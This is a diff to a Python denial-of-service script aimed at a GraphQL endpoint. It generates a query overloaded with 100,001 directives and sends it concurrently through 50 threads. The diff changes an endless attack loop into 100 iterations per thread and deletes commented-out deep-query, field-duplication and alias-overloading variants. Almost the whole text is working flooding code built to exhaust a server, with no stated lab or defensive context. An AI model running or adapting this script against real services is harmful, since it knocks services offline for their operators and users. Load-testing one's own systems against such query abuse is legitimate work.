@@ -60,7 +60,9 @@ def send_graphql_request(query):
   return response, elapsed_time
 
 def attack(query):
-   while True:
+   t = 0
+   while t < 100:
+     t += 1
      try:
        resp, elapsed = send_graphql_request(query)
        print(f"Status Code: {resp.status_code}, Time Taken: {elapsed:.4f} seconds")
@@ -68,40 +70,12 @@ def attack(query):
        print(f"Error occurred: {e}")
 
 def main():
-  # # 1) Deep Query
-  # print("[*] Sending Deep Query...")
-  # deep_query = generate_deep_query(depth=10)
-  # resp_deep, time_deep = send_graphql_request(deep_query)
-  # print("Status Code:", resp_deep.status_code)
-  # print("Response:", "..." + resp_deep.text[-300:]) # Truncate for readability
-  # print(f"Time Taken (Deep Query): {time_deep:.4f} seconds\n")
-
-  # 2) Directive Overloading
-  # May fail validation if repeated directives are not allowed.
   print("[*] Sending Directive Overloading Query...")
   directive_query = generate_directive_overloading_query(m_directives=100001)
   with ThreadPoolExecutor(max_workers=50) as executor:
-    for _ in range(50):
+    for _ in range(50): # 50 x 500
       executor.submit(attack, directive_query)
-  
 
-  # 3) Field Duplication
-  # print("[*] Sending Field Duplication Query...")
-  # field_dup_query = generate_field_duplication_query(n_fields=100100)
-  # print("Generating Payload..")
-  # resp_field_dup, time_field_dup = send_graphql_request(field_dup_query)
-  # print("Status Code:", resp_field_dup.status_code)
-  # print("Response:", resp_field_dup.text) # Truncate for readability
-  # print(f"Time Taken (Field Duplication): {time_field_dup:.4f} seconds\n")
-
-  # 4) Alias Overloading
-  # print("[*] Sending Alias Overloading Query...")
-  # alias_query = generate_alias_overloading_query(n_aliases=100000)
-  # print("Generating Payload..")
-  # resp_alias, time_alias = send_graphql_request(alias_query)
-  # print("Status Code:", resp_alias.status_code)
-  # print("Response:", resp_alias.text) # Truncate for readability
-  # print(f"Time Taken (Alias Overload): {time_alias:.4f} seconds\n")
 
 if __name__ == "__main__":
   main()
